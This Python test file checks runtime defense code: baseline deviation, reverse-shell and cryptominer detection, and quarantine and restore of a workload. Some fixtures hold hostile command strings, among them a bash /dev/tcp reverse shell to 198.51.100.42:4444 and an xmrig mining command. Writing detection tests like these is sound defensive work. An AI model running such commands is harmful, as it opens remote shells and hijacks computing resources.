"""
Unit & Integration Tests for Phase 28 Runtime Defense Modules.
Tests Runtime Telemetry, Behavioral Baselines, Reverse Shell & Miner Detection, and Non-destructive Quarantine.
"""
import pytest
from runtime.telemetry import RuntimeEvent, RuntimeEventType
from runtime.behavior import WorkloadRuntimeBaseline
from runtime.baselines import RuntimeBaselineManager
from runtime.detection import ContainerRuntimeDetector, FindingSeverity
from runtime.response import WorkloadResponseController, WorkloadQuarantineState, RuntimeResponseAction


def test_runtime_baseline_deviation():
    manager = RuntimeBaselineManager()
    baseline = manager.get_baseline("WORKLOAD-991")
    assert baseline is not None

    # Normal MTA event: python process, port 25, approved IP
    normal_event = RuntimeEvent(
        event_id="EVT-001",
        workload_id="WORKLOAD-991",
        container_id="c-mta-01",
        event_type=RuntimeEventType.PROCESS_SPAWNED,
        process_name="python",
        destination_ip="10.0.1.10",
        destination_port=25,
        uid=1000,
    )
    deviations_normal = baseline.check_deviation(normal_event)
    assert len(deviations_normal) == 0

    # Deviant event: unapproved binary 'ncat' on port 4444 to external IP
    anomalous_event = RuntimeEvent(
        event_id="EVT-002",
        workload_id="WORKLOAD-991",
        container_id="c-mta-01",
        event_type=RuntimeEventType.PROCESS_SPAWNED,
        process_name="ncat",
        destination_ip="198.51.100.99",
        destination_port=4444,
        uid=0,  # root escalation
    )
    deviations_anom = baseline.check_deviation(anomalous_event)
    assert len(deviations_anom) >= 3
    assert any("unapproved_process" in d for d in deviations_anom)
    assert any("unapproved_outbound_port" in d for d in deviations_anom)
    assert any("unexpected_uid" in d for d in deviations_anom)


def test_container_runtime_detector_reverse_shell():
    detector = ContainerRuntimeDetector()
    rev_shell_event = RuntimeEvent(
        event_id="EVT-SHELL-01",
        workload_id="WORKLOAD-991",
        container_id="c-mta-01",
        event_type=RuntimeEventType.PROCESS_SPAWNED,
        process_name="bash",
        cmdline="bash -i >& /dev/tcp/198.51.100.42/4444 0>&1",
        destination_ip="198.51.100.42",
        destination_port=4444,
        uid=1000,
    )
    findings = detector.inspect_event(rev_shell_event)
    assert len(findings) >= 1
    shell_findings = [f for f in findings if f.category == "REVERSE_SHELL"]
    assert len(shell_findings) == 1
    assert shell_findings[0].severity == FindingSeverity.CRITICAL
    assert "Execution" in shell_findings[0].mitre_tactics[0]


def test_container_runtime_detector_cryptominer():
    detector = ContainerRuntimeDetector()
    miner_event = RuntimeEvent(
        event_id="EVT-MINER-01",
        workload_id="WORKLOAD-101",
        container_id="c-forensic-01",
        event_type=RuntimeEventType.PROCESS_SPAWNED,
        process_name="xmrig",
        cmdline="./xmrig -o stratum+tcp://xmr.pool.miners:3333 -u 48testwallet",
        uid=1000,
    )
    findings = detector.inspect_event(miner_event)
    assert len(findings) >= 1
    miner_findings = [f for f in findings if f.category == "CRYPTOMINER"]
    assert len(miner_findings) == 1
    assert miner_findings[0].severity == FindingSeverity.CRITICAL


def test_workload_non_destructive_quarantine_and_restore():
    controller = WorkloadResponseController()
    workload_id = "WORKLOAD-991"

    # Initial state
    assert controller.get_state(workload_id) == WorkloadQuarantineState.NORMAL

    # Quarantine action
    record = controller.quarantine_workload(
        workload_id=workload_id,
        reason="Interactive reverse shell detected on port 4444",
        action=RuntimeResponseAction.QUARANTINE_POD,
    )
    assert record.workload_id == workload_id
    assert record.current_state == WorkloadQuarantineState.QUARANTINED
    assert record.network_isolated is True
    assert record.applied_labels.get("isolation.garuda.enterprise/quarantined") == "true"
    assert controller.get_state(workload_id) == WorkloadQuarantineState.QUARANTINED

    # Restore action
    restored = controller.restore_workload(workload_id, reason="Forensic investigation completed - pod sanitized")
    assert restored is not None
    assert restored.current_state == WorkloadQuarantineState.RESTORED
    assert restored.network_isolated is False
    assert controller.get_state(workload_id) == WorkloadQuarantineState.RESTORED
